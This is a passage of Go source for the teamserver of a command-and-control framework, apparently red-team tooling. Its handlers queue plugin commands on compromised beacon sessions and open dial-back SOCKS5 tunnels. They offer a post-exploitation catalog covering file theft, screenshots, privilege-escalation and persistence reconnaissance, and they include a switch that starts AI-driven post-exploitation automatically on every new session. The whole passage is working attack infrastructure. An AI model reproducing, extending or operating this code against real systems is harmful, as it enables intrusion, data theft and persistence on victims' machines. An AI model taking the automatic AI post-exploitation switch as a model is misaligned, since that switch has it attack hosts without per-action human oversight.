func (s *Server) c2PluginDelete(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Plugin(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

// c2PluginRun enqueues each command of the plugin as a task on a target session.
func (s *Server) c2PluginRun(w http.ResponseWriter, r *http.Request) {
	id, _ := pathInt(r, "id")
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(req.SessionID) == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	plugins, err := s.m.pg.ListC2Plugins()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var p *db.C2Plugin
	for _, x := range plugins {
		if x.ID == id {
			p = x
			break
		}
	}
	if p == nil {
		writeErr(w, 404, "插件不存在")
		return
	}
	var cmds []string
	if err := json.Unmarshal(p.Commands, &cmds); err != nil {
		writeErr(w, 400, "插件命令格式错误")
		return
	}
	enqueued := 0
	for _, c := range cmds {
		if strings.TrimSpace(c) == "" {
			continue
		}
		if _, err := s.m.pg.CreateC2Task(req.SessionID, c, "plugin:"+p.Name, nil); err == nil {
			enqueued++
		}
	}
	writeJSON(w, 200, map[string]any{"ok": true, "enqueued": enqueued})
}

// ---------- C2 Tunnels ----------

func (s *Server) c2TunnelsList(w http.ResponseWriter, r *http.Request) {
	items, err := s.m.pg.ListC2Tunnels()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	// lazy restore: tunnels marked running are re-started after a server restart
	if s.c2m != nil {
		for _, t := range items {
			if t.State == "running" && !s.c2m.RunningTunnel(t.ID) {
				if err := s.c2m.StartTunnel(t, s.listenerReachAddr(t.SessionID)); err != nil {
					_ = s.m.pg.SetC2TunnelState(t.ID, "error", err.Error())
					t.State = "error"
				} else {
					t.State = "running"
				}
			}
		}
	}
	for _, t := range items {
		if s.c2m != nil && s.c2m.RunningTunnel(t.ID) {
			t.State = "running"
		}
	}
	writeJSON(w, 200, map[string]any{"tunnels": items})
}

func (s *Server) c2TunnelCreate(w http.ResponseWriter, r *http.Request) {
	if s.c2m == nil {
		writeErr(w, 500, "C2 运行时未初始化")
		return
	}
	var t db.C2Tunnel
	if err := decode(r, &t); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(t.SessionID) == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	if t.Kind == "" {
		t.Kind = "socks5"
	}
	if t.BindHost == "" {
		t.BindHost = "127.0.0.1"
	}
	if t.BindPort == 0 {
		t.BindPort = 1080
	}
	id, err := s.m.pg.SaveC2Tunnel(&t)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	t.ID = id
	if err := s.c2m.StartTunnel(&t, s.listenerReachAddr(t.SessionID)); err != nil {
		_ = s.m.pg.SetC2TunnelState(id, "error", err.Error())
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id, "status": "running"})
}

func (s *Server) c2TunnelDelete(w http.ResponseWriter, r *http.Request) {
	if s.c2m != nil {
		id, _ := pathInt(r, "id")
		_ = s.c2m.StopTunnel(id)
		if err := s.m.pg.DeleteC2Tunnel(id); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		writeJSON(w, 200, map[string]any{"deleted": id})
		return
	}
	id, _ := pathInt(r, "id")
	if err := s.m.pg.DeleteC2Tunnel(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": id})
}

func listenerReachAddr(sessionID string) string {
	// best-effort: use a listener bound on this host so the beacon can dial back
	return ""
}

// listenerReachAddr resolves a reachable teamserver address for a beacon session
// (used as the SOCKS relay dial-back target). Prefers the bound listener's host
// when it is a concrete address, otherwise falls back to the local IP.
func (s *Server) listenerReachAddr(sessionID string) string {
	sessions, err := s.m.pg.ListC2Sessions(1)
	if err != nil {
		return localIP()
	}
	for _, sess := range sessions {
		if sess.SessionID != sessionID || sess.ListenerID == nil {
			continue
		}
		listeners, err := s.m.pg.ListC2Listeners()
		if err != nil {
			break
		}
		for _, l := range listeners {
			if l.ID == *sess.ListenerID && l.Host != "" && l.Host != "0.0.0.0" {
				return l.Host
			}
		}
	}
	return localIP()
}

func localIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok && !ipn.IP.IsLoopback() {
			if ip := ipn.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return "127.0.0.1"
}

func randomHex(n int) string {
	const hexChars = "0123456789abcdef"
	b := make([]byte, n)
	_, _ = rand.Read(b)
	for i := range b {
		b[i] = hexChars[b[i]&15]
	}
	return string(b)
}

// c2SessionAnalyze 返回会话的富化详情 + 最近任务，作为 AI 研判的输入快照。
func (s *Server) c2SessionAnalyze(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("sid")
	sessions, err := s.m.pg.ListC2Sessions(500)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var sess *db.C2Session
	for _, x := range sessions {
		if x.SessionID == sid {
			sess = x
			break
		}
	}
	if sess == nil {
		writeErr(w, 404, "会话不存在")
		return
	}
	tasks, err := s.m.pg.ListC2Tasks(sid, 20)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	completed, failed, running := 0, 0, 0
	for _, t := range tasks {
		switch t.State {
		case "completed":
			completed++
		case "failed":
			failed++
		default:
			running++
		}
	}
	writeJSON(w, 200, map[string]any{
		"session": sess,
		"tasks":   tasks,
		"summary": map[string]any{
			"host":       sess.Hostname,
			"ip":         sess.Host,
			"remote_ip":  sess.RemoteIP,
			"os":         sess.OS + "/" + sess.Arch,
			"user":       sess.Username,
			"process":    sess.ProcessName,
			"connection": sess.Connection,
			"status":     sess.Status,
			"first_seen": sess.FirstSeen,
			"last_seen":  sess.LastSeen,
			"task_stats": map[string]int{"completed": completed, "failed": failed, "pending": running},
		},
	})
}

// ---------- C2 Post-Exploitation ----------

// c2PostexModules is the post-exploitation module catalog (mirrors cmd/beacon).
var c2PostexModules = []map[string]string{
	{"id": "info", "name": "系统信息", "desc": "OS/主机名/用户/CPU/内存/磁盘", "args": ""},
	{"id": "ps", "name": "进程列表", "desc": "目标主机进程列表", "args": ""},
	{"id": "netstat", "name": "网络连接", "desc": "目标主机网络连接与监听端口", "args": ""},
	{"id": "whoami", "name": "当前用户", "desc": "当前用户与权限（sudo/管理员）", "args": ""},
	{"id": "users", "name": "登录用户", "desc": "已登录用户与本地账户", "args": ""},
	{"id": "env", "name": "环境变量", "desc": "目标进程环境变量", "args": ""},
	{"id": "ls", "name": "目录列表", "desc": "列出目录内容", "args": "path（默认当前目录）"},
	{"id": "download", "name": "下载文件", "desc": "读取文件并以 base64 返回", "args": "path"},
	{"id": "upload", "name": "上传文件", "desc": "将 base64 数据写入目标路径", "args": "path base64"},
	{"id": "screenshot", "name": "屏幕截图", "desc": "捕获目标屏幕并 base64 返回", "args": ""},
	{"id": "escalate", "name": "提权侦察", "desc": "sudo -l / 管理员状态 / SUID 枚举", "args": ""},
	{"id": "persist", "name": "持久化侦察", "desc": "计划任务 / cron / systemd 枚举", "args": ""},
}

func (s *Server) c2PostexList(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]any{"modules": c2PostexModules})
}

// c2PostexRun 将后渗透模块作为任务下发到指定会话。危险模块（upload/persist/
// escalate）在开启 HITL 围栏时进入待审批状态。
func (s *Server) c2PostexRun(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("sid")
	var req struct {
		Module string `json:"module"`
		Args   string `json:"args"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(req.Module) == "" {
		writeErr(w, 400, "module 必填")
		return
	}
	found := false
	for _, m := range c2PostexModules {
		if m["id"] == req.Module {
			found = true
			break
		}
	}
	if !found {
		writeErr(w, 400, "未知模块: "+req.Module)
		return
	}
	command := "postex " + req.Module
	if strings.TrimSpace(req.Args) != "" {
		command += " " + strings.TrimSpace(req.Args)
	}
	approval := "approved"
	message := ""
	if s.c2HitlEnabled() && c2DangerousPostex[req.Module] {
		approval = "pending"
		message = "危险后渗透模块，已进入待审批队列"
	}
	id, err := s.m.pg.CreateC2TaskApproval(sid, command, "postex:"+req.Module, nil, approval)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{
		"id": id, "module": req.Module, "session_id": sid,
		"state": "queued", "approval": approval, "message": message,
	})
}

// c2AutoPostexGet 返回自动后渗透开关状态。
func (s *Server) c2AutoPostexGet(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]any{"enabled": s.c2AutoPostexEnabled()})
}

// c2AutoPostexSet 切换自动后渗透开关（新会话上线自动启动 AI 后渗透任务）。
func (s *Server) c2AutoPostexSet(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Enabled bool `json:"enabled"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	val := "off"
	if req.Enabled {
		val = "on"
	}
	if err := s.m.pg.SetSetting(c2AutoPostexSetting, val); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"enabled": req.Enabled})
}
